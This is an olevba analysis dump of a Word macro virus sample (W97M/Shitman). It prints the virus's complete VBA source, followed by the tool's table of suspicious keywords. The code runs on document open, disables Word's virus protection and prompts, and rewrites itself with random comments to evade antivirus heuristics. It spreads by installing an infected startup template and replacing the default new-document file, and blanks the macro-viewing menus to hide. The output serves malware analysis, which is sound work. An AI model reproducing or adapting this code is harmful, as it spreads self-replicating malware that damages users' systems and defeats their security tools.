olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Chaos.b-8f416b21529c8e161d830b410eea6afd07a9bcaf
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Chaos.b-8f416b21529c8e161d830b410eea6afd07a9bcaf - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Shitman.bas 
in file: Virus.MSWord.Chaos.b-8f416b21529c8e161d830b410eea6afd07a9bcaf - OLE stream: 'Macros/VBA/Shitman'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()

    'EOKIZQVEDHEXCDHPEXJNZYFGL
'W97M/Shitman by Lord Natas
'2/12/98 (its about time I released it!)
'"Without the threat of death there's no reason to live at all"
'-Marilyn Manson

    Rem ZFMFVFIJNTXE
On Error Resume Next

    Options.VirusProtection = False
    Options.SaveNormalPrompt = False
    Options.SavePropertiesPrompt = False
    Options.ConfirmConversions = False

    Application.ScreenUpdating = False
    Application.DisplayAlerts = wdAlertsNone
    Rem TSEFSQAZQGGRZHGK
    Options.VirusProtection = True
    Application.EnableCancelKey = wdCancelDisabled
    WordBasic.DisableAutoMacros = 0
    Options.VirusProtection = True
    'RQCACBVZWDUYQDCJOYD
    Rem MPJAUZUFUJVZFE
    Options.SaveNormalPrompt = True
    'BQERIRXNAHCAMDGTBOPBHQEYZMEVXK
    Options.SavePropertiesPrompt = True
    Options.ConfirmConversions = True
    
    'confuse fucking Avers Huristics
    
    Options.VirusProtection = False
    'JLIKIZRTMZJULHHUAWRMCVRCMB
    Options.SaveNormalPrompt = False
    Options.SavePropertiesPrompt = False
    Options.ConfirmConversions = False
    'MHDXY


    If Second(Now()) = (6 + 6 + 6) Then
        'some code here was stolen from the APMRS
        Set Current = MacroContainer
        Randomize
        
        Options.VirusProtection = False
        Options.SaveNormalPrompt = False
        Options.SavePropertiesPrompt = False
    'JRBCYMOF
        Options.ConfirmConversions = False
    'HDMRLFEXXUTODPUILZCHZKBAGJ
        
        For Grow = 1 To Int((30 - 10 + 1) * Rnd + 10)
            N1 = Current.VBProject.VBComponents("Shitman").CodeModule.ProcCountLines("AutoOpen", vbext_pk_Proc)
            N2 = Current.VBProject.VBComponents("Shitman").CodeModule.ProcCountLines("FileNewDefault", vbext_pk_Proc)
            N3 = Current.VBProject.VBComponents("Shitman").CodeModule.ProcCountLines("FileNew", vbext_pk_Proc)
            Number = N1 + N2 + N3
            RandomLine = Int(Rnd() * Number + 1)
            Randomize
            RemarkLength = Int(Rnd() * 40 + 1)
               For Length = 1 To RemarkLength
    Rem RUUGKQ
                    Remark = Remark + Chr$(Int((90 - 65 + 1) * Rnd + 65))
                Next Length
            If Rnd > Rnd Then
    'NBBMHLKJHWAVZNWHCZKDFYVDXHWXYELX
            Current.VBProject.VBComponents("Shitman").CodeModule.InsertLines RandomLine, vbTab & "Rem " & Remark
            Else
            Current.VBProject.VBComponents("Shitman").CodeModule.InsertLines RandomLine, vbTab & "'" & Remark
            End If
            Remark = ""
        Next Grow
    End If
    
    Options.VirusProtection = False
    Options.SaveNormalPrompt = False
    Rem DOFKKFZF
    Options.SavePropertiesPrompt = False
    Options.ConfirmConversions = False
    'YGIGKYFWARGEYVSQNPCQJVFWEZFXD

    'YVWZQLUAIEQTPKEQMGCOZHZOODRTIZYTCRFBVNS
    Rem EDYBGEKJKTNMUSUPEOKMPKYYVXDRHUQYIHO
    Startup = Options.DefaultFilePath(wdStartupPath)
    If Startup = "" Then
        WrdDir = Options.DefaultFilePath(wdProgramPath)
        MkDir WrdDir & "\Startup"
        Options.DefaultFilePath(wdStartupPath) = WrdDir & "\Startup"
    End If

    sName = Options.DefaultFilePath(wdStartupPath) & "\Word100.dot"
    If Dir(sName) = "" Then
        ActiveName = ActiveDocument.FullName
        Documents.Add
        Application.OrganizerCopy Source:=ActiveName, Destination:=ActiveDocument.FullName, Name:="Shitman", Object:=wdOrganizerObjectProjectItems
        ActiveDocument.SaveAs FileName:=sName, FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
        sFile = "c:\windows\shellnew\Winword8.doc"
        ActiveDocument.Close
        If Dir(sFile) <> "" Then
            Kill sFile
            FileCopy sName, sFile
    'LBRICFCOZUVKUQVEOIWTR
        End If
        AddIns.Add FileName:=sName, Install:=True
    End If

End Sub

Sub FileNewDefault()
On Error Resume Next

    Options.VirusProtection = False
    'JCOIRYZBNSEKBRTUAPXUXSOBQZJXMQHVXWEMDY
    Rem GDGYGWKVVROTDSSVRCTJHYRNINXAJUZJXAL
    Options.SaveNormalPrompt = False
    Options.SavePropertiesPrompt = False
    Options.ConfirmConversions = False
    'OFFCPUTCEQPLRURAVZLZL

    sName = Options.DefaultFilePath(wdStartupPath) & "\Word100.dot"
    If sName = "" Then Call AutoOpen
    Documents.Add Template:=sName, NewTemplate:=True

End Sub

Sub FileNew()
On Error Resume Next

    Options.VirusProtection = False
    Options.SaveNormalPrompt = False
    Options.SavePropertiesPrompt = False
    Options.ConfirmConversions = False

    Application.ScreenUpdating = False
    sName = Options.DefaultFilePath(wdStartupPath) & "\Word100.dot"
    If sName = "" Then Call AutoOpen
    Dialogs(wdDialogFileNew).Show
    ActiveDocument.Close
    Documents.Add Template:=sName, NewTemplate:=True
    'HMRGVEBECLLYPBLIIJIMNZGVOAVGFOZ

    'KTMSVLATFY
    'KIAYNJFRUNXFMUNKXQWZVI
End Sub

Sub ToolsMacro()

End Sub

Sub FileTemplates()

End Sub

Sub ViewVBCode()

End Sub

Sub FormatStyle()

End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|FileCopy            |May copy a file                              |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|MkDir               |May create a directory                       |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

